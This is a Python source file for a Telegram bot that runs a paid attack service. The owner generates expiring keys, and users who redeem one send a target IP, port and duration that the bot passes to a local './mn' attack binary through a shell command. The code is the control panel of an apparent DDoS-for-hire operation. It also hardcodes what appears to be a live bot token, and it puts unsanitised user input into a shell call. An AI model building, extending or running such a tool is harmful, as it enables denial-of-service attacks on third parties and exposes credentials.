import random
import string
import time
import asyncio
import logging

from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters

# --- CONFIG ---
BOT_TOKEN = "7312643382:AAGnwf8VjizRRxgoxcF7asE_4oIaff9ng3g"  # Replace with your bot token
OWNER_ID = 5879359815  # Replace with your real Telegram user ID

# Redeem key storage (in-memory)
REDEEM_KEYS = {}

# Redeemed users storage
REDEEMED_USERS = set()

# VPS IP List
VPS_IPS = [
    "192.168.1.100",
    "192.168.1.101",
    "192.168.1.102",
    "192.168.1.103",
    "192.168.1.104",
    "192.168.1.105",
    "192.168.1.106",
    "192.168.1.107",
    "192.168.1.108",
    "192.168.1.109",
    "192.168.1.110"
]

# User attack states
user_attack_state = {}

# Global attack status
attack_in_progress = False

# --- KEYBOARDS ---
main_keyboard = ReplyKeyboardMarkup(
    [
        [KeyboardButton("/start"), KeyboardButton("/help")],
        [KeyboardButton("/attack"), KeyboardButton("/genkey")],
        [KeyboardButton("/redeem"), KeyboardButton("/ping")]
    ],
    resize_keyboard=True
)

genkey_keyboard = ReplyKeyboardMarkup(
    [
        [KeyboardButton("1 DAY KEY"), KeyboardButton("7 DAYS KEY")],
        [KeyboardButton("15 DAYS KEY"), KeyboardButton("30 DAYS KEY")],
        [KeyboardButton("BACK")]
    ],
    resize_keyboard=True
)

# --- FUNCTIONS ---

def generate_key(length: int = 10) -> str:
    """Generate a random key."""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

async def run_attack_command_async(target_ip, target_port, duration, update: Update):
    """Run the real attack command asynchronously."""
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./mn {target_ip} {target_port} {duration} 1420",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            logging.info(f"ATTACK STDOUT: {stdout.decode().strip()}")
        if stderr:
            logging.error(f"ATTACK STDERR: {stderr.decode().strip()}")

    except Exception as e:
        logging.error(f"Attack error: {e}")
        await update.message.reply_text(f"❌ Attack failed: {e}", reply_markup=main_keyboard)
    finally:
        attack_in_progress = False
        await notify_attack_finished(target_ip, target_port, duration, update)

async def notify_attack_finished(target_ip, target_port, duration, update: Update):
    """Send a message when attack is finished."""
    await update.message.reply_text(
        f"✅ Attack on {target_ip}:{target_port} finished after {duration} seconds.",
        reply_markup=main_keyboard
    )

# --- COMMAND HANDLERS ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command."""
    user_attack_state.pop(update.effective_user.id, None)
    await update.message.reply_text("Welcome to the Bot!", reply_markup=main_keyboard)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command."""
    user_attack_state.pop(update.effective_user.id, None)
    help_text = (
        "/start - Restart Bot\n"
        "/help - Show Commands\n"
        "/attack - Start Attack (after redeem)\n"
        "/genkey - Generate Redeem Key (Owner Only)\n"
        "/redeem <key> - Redeem a Key\n"
        "/ping - Check Bot Speed"
    )
    await update.message.reply_text(help_text, reply_markup=main_keyboard)

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /ping command."""
    start_time = time.time()
    msg = await update.message.reply_text("Pinging...")
    end_time = time.time()
    latency = (end_time - start_time) * 1000
    await msg.edit_text(f"Bot speed: {int(latency)} ms", reply_markup=main_keyboard)

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /genkey command."""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Only the owner can generate keys.", reply_markup=main_keyboard)
        return

    await update.message.reply_text("Choose the key duration:", reply_markup=genkey_keyboard)

async def handle_genkey_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle genkey duration button clicks."""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Only the owner can generate keys.", reply_markup=main_keyboard)
        return

    text = update.message.text
    days = None

    if text == "1 DAY KEY":
        days = 1
    elif text == "7 DAYS KEY":
        days = 7
    elif text == "15 DAYS KEY":
        days = 15
    elif text == "30 DAYS KEY":
        days = 30
    elif text == "BACK":
        await update.message.reply_text("Back to main menu.", reply_markup=main_keyboard)
        return
    else:
        await update.message.reply_text("❌ Invalid option. Please select again.", reply_markup=genkey_keyboard)
        return

    key = generate_key()
    expiry_timestamp = int(time.time()) + (days * 86400)
    REDEEM_KEYS[key] = expiry_timestamp

    await update.message.reply_text(
        f"✅ Successfully generated a {days}-Day Key:\n\n<code>{key}</code>",
        parse_mode="HTML",
        reply_markup=main_keyboard
    )

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /redeem command."""
    if not context.args:
        await update.message.reply_text("Please provide a key.\nExample: /redeem YOURKEY", reply_markup=main_keyboard)
        return

    key = context.args[0].strip().upper()

    if key in REDEEM_KEYS:
        expiry = REDEEM_KEYS.pop(key)
        time_left = expiry - int(time.time())

        if time_left > 0:
            days_left = time_left // 86400
            REDEEMED_USERS.add(update.effective_user.id)
            await update.message.reply_text(
                f"✅ Key redeemed successfully!\nExpires in: {days_left} day(s).\nYou can now use /attack.",
                reply_markup=main_keyboard
            )
        else:
            await update.message.reply_text("❌ This key has expired.", reply_markup=main_keyboard)
    else:
        await update.message.reply_text("❌ Invalid or already used key.", reply_markup=main_keyboard)

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /attack command."""
    if update.effective_user.id not in REDEEMED_USERS and update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You must redeem a key first to use attack.\nUse /redeem YOURKEY.", reply_markup=main_keyboard)
        return

    user_attack_state[update.effective_user.id] = True
    await update.message.reply_text(
        "Please send attack details:\n\n<code>IP PORT TIME THREADS</code>",
        parse_mode="HTML"
    )

async def handle_attack_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle attack details input."""
    user_id = update.effective_user.id

    if not user_attack_state.get(user_id):
        await update.message.reply_text("Unknown input. Use /help.", reply_markup=main_keyboard)
        return

    text = update.message.text.strip()
    parts = text.split()

    if len(parts) != 4:
        await update.message.reply_text("❌ Invalid format.\nSend like: <code>IP PORT TIME THREADS</code>", parse_mode="HTML")
        return

    ip, port, duration, threads = parts

    if not (port.isdigit() and duration.isdigit() and threads.isdigit()):
        await update.message.reply_text("❌ PORT, TIME, and THREADS must be numbers.", reply_markup=main_keyboard)
        return

    # Choose random VPS IP
    vps_ip = random.choice(VPS_IPS)

    global attack_in_progress
    if attack_in_progress:
        await update.message.reply_text("❌ Another attack is already in progress.", reply_markup=main_keyboard)
        return

    await update.message.reply_text(
        f"🚀 ATTACK START\n\n"
        f"🌐<b>Target:</b> {ip}:{port}\n"
        f"🕛<b>Duration:</b> {duration}s\n"
        f"🪛<b>Threads:</b> {threads}\n"
        f"🇮🇳<b>VPS:</b> {vps_ip}",
        parse_mode="HTML",
        reply_markup=main_keyboard
    )

    asyncio.create_task(run_attack_command_async(ip, port, duration, update))
    user_attack_state.pop(user_id, None)

async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle unknown commands."""
    await update.message.reply_text("Unknown command. Use /help.", reply_markup=main_keyboard)

# --- MAIN FUNCTION ---

def main():
    """Run the bot."""
    app = Application.builder().token(BOT_TOKEN).build()

    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("ping", ping))
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("attack", attack))

    # Genkey button handler
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex("^(1 DAY KEY|7 DAYS KEY|15 DAYS KEY|30 DAYS KEY|BACK)$"), handle_genkey_buttons))

    # Attack input handler
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_attack_input))

    # Unknown command
    app.add_handler(MessageHandler(filters.COMMAND, unknown))

    print("Bot is running smoothly...")
    app.run_polling()

if __name__ == "__main__":
    main()